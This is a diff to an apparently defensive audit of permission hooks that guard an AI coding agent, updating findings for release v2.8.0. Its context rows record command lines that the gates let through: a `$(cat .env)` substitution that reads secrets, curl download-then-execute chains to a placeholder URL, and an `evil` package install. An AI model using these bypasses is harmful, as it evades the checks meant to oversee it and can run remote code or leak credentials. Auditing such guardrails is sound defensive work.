@@ -5,6 +5,35 @@ written against `560588c` and earlier) · **Baseline:** annotated tag `v2.7.4` �
 `d884a43`, which is where this analysis started and against which every delta
 below is measured.
 
+**SUBJECT NOTE, 2026-08-14 — `main` has moved; nothing below is re-measured.**
+`main` is now **`0d4d5af` = annotated tag `v2.8.0`** (PR #66 `3af0c11` — the
+X-52 docs line, and NOT docs-only: per its merge diff, this document's RE-BASE
+block, the security KB, the threat-model draft and the backlog threat-model
+re-sort, PLUS the fail-open retraction's sweep through four `lib/` files —
+including the installer's runtime warning string, an executable f-string —
+with golden digests re-baselined under freeze exception no. 67; then PR #67,
+the v2.8.0 LIT literature fold). Re-derived on `0d4d5af` today:
+**C-1** — `git ls-files | grep -icE 'licen[cs]e'` → **0**, so **v2.8.0 is a
+second tagged release with no LICENSE** and the verdict cannot have moved; for
+the first time since v2.7.4, "not production ready" attaches to an *adoptable*
+tag that ships item 1, B4/X-45..X-51, the X-52 line and the LIT fold, with no
+legal grant to adopt any of it — §9's "no external adopter can obtain" is
+overtaken in exactly this sense. **Backlog rows `open` = 105**, unchanged from
+`053a367` by the same validated rule (re-validated at 88 on v2.7.4); suite
+**25 / 9,668 / 0**; differential **4,104**; X-54/X-55 still `open` (X-54's own
+row now records **159.52 s** post-memo, 2.7× past the ceiling). The LIT fold
+moves no gate mechanism — emitted `gates.py` AST-identical across
+`053a367..0d4d5af` (`f71ec4a81bae9f826e39d06f361dac5f`), all 11 hook bodies
+identical comment-stripped, settings delta = the `_generatedBy` stamp — so no
+C-row, no §2 class and no cost figure below is re-measured by it. Its one
+behavioral change, LIT-07, binds the operator-COMPLETED loop — the emitted
+skeleton still dispatches nothing, so C-2 stands — and its migration is a
+hand-edit the digest guard deliberately skips: **on existing installs the new
+binding item is unenforced by construction.** LIT-06's golden-task harness and
+LIT-02's consolidation gate run through the autonomous modes C-2 records as
+dispatching nothing — the gap C-2 describes gains dependents, not
+contradictions.
+
 **How to read this document.** It is layered, oldest evidence at the bottom,
 and the layering is deliberate — nothing that was measured is deleted when it
 stops being current, because a finding that *was* true is the only way to show
@@ -12,7 +41,7 @@ what a change actually bought.
 
 | layer | subject | status |
 |---|---|---|
-| **RE-BASE** (below) | `main` @ **053a367** | **what is true today** |
+| **RE-BASE** (below) | `main` @ **053a367** | **current as of 2026-08-13; see SUBJECT NOTE above** |
 | HISTORY — SUPERSEDED ASSESSMENT | `main` @ 560588c | superseded by PR #64 and PR #65; retained as evidence, **not re-measured** |
 | HISTORY — REVISION 1 | branch `fix/item1-…` @ e47d827 | superseded, retained as evidence |
 | HISTORY — §§0–9 (2026-08-08) | tag `v2.7.4` @ d884a43 | superseded **as a description of `main`**; still exactly true of the tag |
@@ -521,7 +550,8 @@ got 0 files` — and the same file passes 34/34 in a real checkout, so main's
 real figure is 9,462 and the original number reconciles exactly.)*
 
 The suite's only coverage of the `"$(cat .env)"` carrier
-(`tests/test_substrate_differential.py:2304`) always pairs it with
+(`tests/test_substrate_differential.py:2304` *[@ v2.8.0 the corrected row is
+at `:2443`]*) always pairs it with
 `rg -g '!*.pem'` — which denies on the **glob token alone**. `rg foo "$(cat .env)"`
 allows. Backlog row **X-32j** cites that exact `rg` command as proof the
 substitution veto works.
@@ -537,7 +567,7 @@ the wrong reason* — sitting unrecognised inside the corpus written to detect i
 >   holds w/ trailing sub"* with the confound spelled out in the comment.
 > - **X-32j** was reopened, the confound named, and re-closed.
 > - It is no longer the suite's only coverage: a **95-row `_DQCS` section** at
->   `tests/test_substrate_differential.py:3042` measures the carrier
+>   `tests/test_substrate_differential.py:3042` *[@ v2.8.0: `:3188`]* measures the carrier
 >   unconfounded, including the exact probe this document proposed —
 >   `rg foo "$(cat .env)"`, ALLOW/ALLOW at the tag, **DENY/DENY** now (and
 >   under real bash the secret really is read: `rc=2 markers=['cat .env']
@@ -577,7 +607,7 @@ document, not regressions.
 | C-5 | **N-1 — the documented approval path is inert** | **STILL TRUE @ e47d827.** The approved list is a heredoc baked in at emission time (`dependency-gate.sh:1596-1598`, empty on a stock install); `.claude/steering/deps.md` is never read — all 13 occurrences of that path in the emitted tree are comments or `echo … >&2` message text, with no `read`/`cat`/`open()`/`mapfile`/`<` against it on either substrate. Following the printed remediation exactly (`printf '\n- requests\n' >> .claude/steering/deps.md`) changes nothing: `pip install requests` is rc=2 DENY before and after, with byte-identical refusal text. The only documented way to approve a package does nothing. |
 | C-6 | **X-36r + X-36i — live download-then-execute** | **STILL TRUE @ e47d827, and wider than the row.** Re-measured with the stock config: `curl -o python3 <url> ; ./python3 app.py`, `curl -o x/python3 <url> ; ./x/python3`, `curl u \| python3-dbg`, `curl u \| python3.11-dbg` and `curl u \| python3.6m` are all allow/allow and all fire a `REMOTE-PAYLOAD-RAN` marker under real bash, while their `python3.12` / `python3.13t` twins deny/deny. **Wider than its row's three examples** — a plain `curl u > python3 ; chmod +x python3 ; ./python3` is live too. One honest narrowing: the row's `awk '{print > "./python3"}'` example is permission-only as written (rc=126 — awk leaves the file non-executable); it becomes live with a `chmod +x`, still allow/allow. `pip3.13t install evil` (X-36i's second half) also allows on both and the install command runs. |
 | C-7 | **SDK substrate never executed against the real SDK** | **STILL TRUE @ e47d827.** `import claude_agent_sdk` → `ModuleNotFoundError`; `pip show claude-agent-sdk` → not found; no venv in the tree. All 4 test files that reference the module create `types.ModuleType("claude_agent_sdk")` and inject it into `sys.modules`. Only ever against a hand-written stub. |
-| C-8 | **X-36z — `eval-gate` ships a dead branch** | **STILL TRUE @ e47d827.** Exactly 4 occurrences of `@{{u}}` in the emitted `eval-gate.sh`, unchanged from the tag — 2 in comments, 2 **executable** (`:1616` and `:1617`); the correct `@{u}` form appears nowhere in the emitted shell hook. Proven dead in a throwaway repo *with* an upstream: `git rev-parse --verify -q '@{u}'` → rc=0, `'@{{u}}'` → rc=1, so the `if` never fires and the chain falls through to `HEAD~1`. The SDK spells it correctly (`gates.py:3336`, `("@{u}..HEAD", "HEAD~1")`), which is the source of the disagreement. |
+| C-8 | **X-36z — `eval-gate` ships a dead branch** | **STILL TRUE @ e47d827.** Exactly 4 occurrences of `@{{u}}` in the emitted `eval-gate.sh`, unchanged from the tag — 2 in comments, 2 **executable** (`:1616` and `:1617`) *[@ v2.8.0: still exactly 4 occurrences, 2 executable, now `:2491`/`:2492` of the emitted hook]*; the correct `@{u}` form appears nowhere in the emitted shell hook. Proven dead in a throwaway repo *with* an upstream: `git rev-parse --verify -q '@{u}'` → rc=0, `'@{{u}}'` → rc=1, so the `if` never fires and the chain falls through to `HEAD~1`. The SDK spells it correctly (`gates.py:3336`, `("@{u}..HEAD", "HEAD~1")`), which is the source of the disagreement. |
 
 **K-2 sharpens all of the above, and CORRECTION — the true ratio is worse:
 "7 of 11" is never true of any one install.** Recounted from the emitted
@@ -847,7 +877,10 @@ gates then function as a seatbelt against mistakes, not as a control against an
 adversary — which is what §2 actually establishes.
 
 **What the tag must not be marketed as** is a security boundary against a
-motivated agent or a compromised dependency.
+motivated agent or a compromised dependency. `docs/threat-model.md` (draft
+2026-08-13, not yet emitted into installs) now states this calibration in the
+adopter's own terms — it is the disclosure this section says the tag must
+carry, and it reaches no install yet.
 
 **CHANGED @ e47d827:** the branch does not change this paragraph. It makes the
 seatbelt fit better — a whole class of accidental-and-deliberate substitution
@@ -949,7 +982,9 @@ both cheap and both eroding the tracker's trustworthiness:
 10. **Repair the tracker's own metadata** — the `**Snapshot:**` header
     (`main @ 3c0a2de`, 2026-07-21) predates eight sections; `## Priority
     reading` is byte-identical to the v2.7.4 version and names none of the
-    twelve genuinely blocking rows; and P-18's "10 over-celled rows" is now 15.
+    twelve genuinely blocking rows *(@ v2.8.0: rewritten by the X-52 line — no
+    longer byte-identical — but still names none of the twelve; the Snapshot
+    header still reads `main @ 3c0a2de`)*; and P-18's "10 over-celled rows" is now 15.
     *(The X-42/X-43 missing-status half of this item was fixed on 2026-08-09.)*
 
 ---
